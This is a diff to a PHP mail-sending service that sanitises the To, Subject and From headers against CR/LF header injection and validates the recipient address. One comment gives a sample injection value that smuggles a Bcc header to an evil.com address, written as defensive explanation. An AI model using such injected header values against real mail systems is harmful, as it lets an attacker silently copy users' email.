@@ -233,13 +233,27 @@ final class CommunicationService
      */
     private function fallbackMail(array $message): array
     {
-        $to = $message['to'];
-        $subject = $message['subject'];
+        $to = str_replace(["\r", "\n"], '', $message['to']);
+        $subject = str_replace(["\r", "\n"], '', $message['subject']);
         $body = $message['html'] ?? $message['body'];
         $headers = "Content-Type: text/html; charset=UTF-8\r\n";
 
+        // Reject malformed recipient addresses rather than letting mail()
+        // accept and silently drop them. An invalid $to could otherwise be
+        // smuggled into additional headers via newlines on some MTAs.
+        if ($to === '' || filter_var($to, FILTER_VALIDATE_EMAIL) === false) {
+            return ['success' => false, 'error' => 'Invalid recipient address'];
+        }
+
         if (!empty($message['from'])) {
-            $headers .= "From: {$message['from']}\r\n";
+            // Strip CR/LF from the From header value to prevent header
+            // injection. An admin-controlled mail_from_name such as
+            // "OwnPay\r\nBcc: victim@evil.com" would otherwise cause
+            // every outbound email to BCC the attacker.
+            $from = str_replace(["\r", "\n"], '', (string) $message['from']);
+            if ($from !== '') {
+                $headers .= "From: {$from}\r\n";
+            }
         }
 
         $sent = @mail($to, $subject, $body, $headers);
